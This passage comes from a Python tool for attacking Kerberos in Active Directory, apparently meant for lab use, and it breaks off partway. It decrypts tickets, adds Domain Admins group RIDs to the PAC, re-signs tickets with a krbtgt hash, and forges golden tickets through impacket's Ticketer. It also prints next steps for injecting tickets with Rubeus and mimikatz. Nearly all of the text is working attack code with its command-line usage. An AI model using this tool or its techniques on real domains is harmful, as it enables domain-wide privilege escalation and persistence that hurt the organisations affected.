        output_file = prompt(f"Output file [{default_output}]: ").strip().strip('"').strip("'") or default_output
        info(f"Ticket: {ticket_file}")
        info(f"Session key: {bytes_to_hex(session_key)[:32]}...")
        info(f"krbtgt key:  {bytes_to_hex(krbtgt_key)[:32]}...")
        info(f"Groups: {group_rids}")
        self.ticket_manipulator = TicketManipulator(self.config['domain_sid'], self.config['krbtgt_hash'])
        sec("STEP 1: DECRYPT TICKET")
        with open(ticket_file, 'rb') as f:
            ticket_data = f.read()
        info(f"Read {len(ticket_data)} bytes")
        self.decrypted_ticket = self.ticket_manipulator.decrypt_ticket(ticket_data, session_key)
        if not self.decrypted_ticket:
            return
        sec("STEP 2: EXTRACT PAC")
        if not self.ticket_manipulator.extract_pac(self.decrypted_ticket):
            return
        self.ticket_manipulator.show_pac_buffers()
        sec("STEP 3: MODIFY GROUPS")
        added = self.ticket_manipulator.modify_groups(group_rids)
        if added == 0:
            warn("No new groups added")
            return
        sec("STEP 4: REBUILD TICKET")
        success = self.ticket_manipulator.rebuild_ticket(self.decrypted_ticket, output_file, server_key=krbtgt_key, krbtgt_key=krbtgt_key)
        if success:
            sec("ATTACK COMPLETE")
            print(f"\n  {G}{BO}Modified ticket saved:{RS} {W}{output_file}{RS}")
            print(f"\n  {Y}Next steps:{RS}")
            print(f"  {W}  1. Transfer {output_file} to target system{RS}")
            print(f"  {W}  2. Inject: Rubeus.exe ptt /ticket:{output_file}{RS}")
            print(f"  {W}  3. Or: mimikatz.exe 'kerberos::ptt {output_file}' 'exit'{RS}")
            print(f"  {W}  4. Verify: klist{RS}")

    def menu_inject(self):
        sec("INJECT FORGED PAC")
        warn("Creates a fully forged ticket from scratch")
        target_user = prompt("Target username: ").strip()
        if not target_user:
            err("Username required")
            return
        domain = prompt(f"Domain [{self.config['domain']}]: ").strip() or self.config['domain']
        krbtgt_hex = prompt(f"krbtgt hash [{self.config['krbtgt_hash']}]: ").strip()
        krbtgt_hash = krbtgt_hex or self.config['krbtgt_hash']
        domain_sid = prompt(f"Domain SID [{self.config['domain_sid']}]: ").strip() or self.config['domain_sid']
        group_rids = self.select_groups()
        if not group_rids:
            group_rids = [512, 513]
        output_file = prompt("Output .kirbi file [forged.kirbi]: ").strip().strip('"').strip("'") or "forged.kirbi"
        info(f"Creating forged ticket for {target_user}@{domain}")
        info(f"Groups: {group_rids}")
        if HAS_IMPACKET:
            try:
                from impacket.examples.ticketer import Ticketer
                options = type('Options', (), {
                    'domain': domain, 'user': target_user, 'password': '',
                    'nthash': krbtgt_hash, 'aesKey': None, 'domain_sid': domain_sid,
                    'user_id': 500, 'groups': ','.join(map(str, group_rids)),
                    'duration': '10', 'spn': None, 'extra_pac': False,
                    'old_pac': False, 'target': None, 'service': None,
                    'exportType': 2, 'outfile': output_file,
                    'debug': False, 'kdc': self.config['dc_ip'],
                    'sessionKey': None, 'extra_sid': None,
                })()
                ticketer = Ticketer(options)
                ticketer.loadOptions(options)
                ticketer.run()
                ok(f"Forged ticket saved: {output_file}")
            except ImportError:
                err("Ticketer not available")
                info(f"Try: impacket-ticketer -nthash {krbtgt_hash} -domain-sid {domain_sid} -user-id 500 -groups {','.join(map(str, group_rids))} -domain {domain} {target_user}")
            except Exception as e:
                err(f"Failed: {e}")
        else:
            err("impacket required for ticket forging")
            print(f"  {W}Install: {sys.executable} -m pip install impacket pyasn1 --break-system-packages{RS}")

    def menu_modify(self):
        sec("MODIFY PAC GROUPS DIRECTLY")
        if not HAS_IMPACKET:
            err("impacket is required")
            print(f"\n  {BO}To fix:{RS}")
            print(f"  {W}{sys.executable} -m pip install impacket pyasn1 --break-system-packages{RS}\n")
            return
        ticket_file = prompt("Path to .kirbi ticket file: ").strip().strip('"').strip("'")
        if not ticket_file or not os.path.exists(ticket_file):
            err(f"File not found: {ticket_file}")
            return
        session_key_hex = prompt("Session key (hex): ").strip().replace(':', '').replace(' ', '')
        try:
            session_key = hex_to_bytes(session_key_hex)
        except Exception as e:
            err(f"Invalid session key: {e}")
            return
        self.ticket_manipulator = TicketManipulator(self.config['domain_sid'], self.config['krbtgt_hash'])
        with open(ticket_file, 'rb') as f:
            ticket_data = f.read()
        decrypted = self.ticket_manipulator.decrypt_ticket(ticket_data, session_key)
        if not decrypted:
            return
        if not self.ticket_manipulator.extract_pac(decrypted):
            return
        self.ticket_manipulator.show_pac_buffers()
        if not self.ticket_manipulator.pac_manipulator.extract_validation_info():
            err("Could not extract validation info")
            return
        self.ticket_manipulator.pac_manipulator.show_current_groups()
        group_rids = self.select_groups()
        if group_rids:
            added = self.ticket_manipulator.pac_manipulator.add_groups(group_rids)
            if added > 0:
                output_file = prompt("Output file [modified.kirbi]: ").strip() or "modified.kirbi"
                krbtgt_key = hex_to_bytes(self.config['krbtgt_hash'])
                success = self.ticket_manipulator.rebuild_ticket(decrypted, output_file, server_key=krbtgt_key, krbtgt_key=krbtgt_key)
                if success:
                    ok(f"Modified ticket saved: {output_file}")

    def run(self):
        self.show_banner()
        while True:
            self.show_menu()
            choice = prompt("Select option: ").strip()
            if choice == '0' or choice.lower() in ('exit', 'quit', 'q'):
                print(f"\n  {G}Goodbye!{RS}\n")
                break
            elif choice == '1':
                self.menu_steal()
            elif choice == '2':
                self.menu_inject()
            elif choice == '3':
                self.menu_modify()
            elif choice == '4':
                self.show_info()
            elif choice.lower() == 'config':
                self.configure_lab()
            else:
                warn(f"Unknown option: {choice}")
            try:
                input(f"\n  {DIM}Press ENTER to continue...{RS}")
            except (KeyboardInterrupt, EOFError):
                print(f"\n  {G}Goodbye!{RS}\n")
                break


# ── CLI Mode ────────────────────────────────────────────────────────────────

def cli_mode(args):
    print(banner())
    if args.info:
        # In info mode, we still need config - prompt for it
        menu = InteractiveMenu()
        menu.show_info()
        return
    if not HAS_IMPACKET:
        err("impacket is required for CLI mode")
        print(f"  {W}Install: {sys.executable} -m pip install impacket pyasn1 --break-system-packages{RS}")
        sys.exit(1)
    if not args.ticket or not args.session_key:
        print(f"\n{R}[!] --ticket and --session-key are required{RS}")
        sys.exit(1)
    # CLI mode requires explicit config values since LAB_DEFAULTS is empty
    if not args.krbtgt_hash:
        print(f"\n{R}[!] --krbtgt-hash is required in CLI mode{RS}")
        print(f"  {W}Example: --krbtgt-hash aabbccdd11223344556677889900aabb{RS}")
        sys.exit(1)
    if not args.domain_sid:
        print(f"\n{R}[!] --domain-sid is required in CLI mode{RS}")
        print(f"  {W}Example: --domain-sid S-1-5-21-1234567890-1234567890-1234567890{RS}")
        sys.exit(1)
    group_rids = []
    if args.add_group:
        for g in args.add_group.split(','):
            g = g.strip()
            if g.isdigit():
                group_rids.append(int(g))
    if not group_rids:
        group_rids = [512]
    output = args.output or args.ticket + ".pac_modified"
    session_key = hex_to_bytes(args.session_key)
    krbtgt_key = hex_to_bytes(args.krbtgt_hash)
    manipulator = TicketManipulator(args.domain_sid, args.krbtgt_hash)
    sec("PAC MANIPULATION ATTACK")
    if not os.path.exists(args.ticket):
        err(f"File not found: {args.ticket}")
        sys.exit(1)
    info(f"Ticket: {args.ticket}")
    info(f"Session key: {bytes_to_hex(session_key)[:32]}...")
    info(f"krbtgt key:  {bytes_to_hex(krbtgt_key)[:32]}...")
    info(f"Groups: {group_rids}")
    sec("STEP 1: DECRYPT TICKET")
    with open(args.ticket, 'rb') as f:
        ticket_data = f.read()
    info(f"Read {len(ticket_data)} bytes")
    decrypted = manipul... (3 KB left)
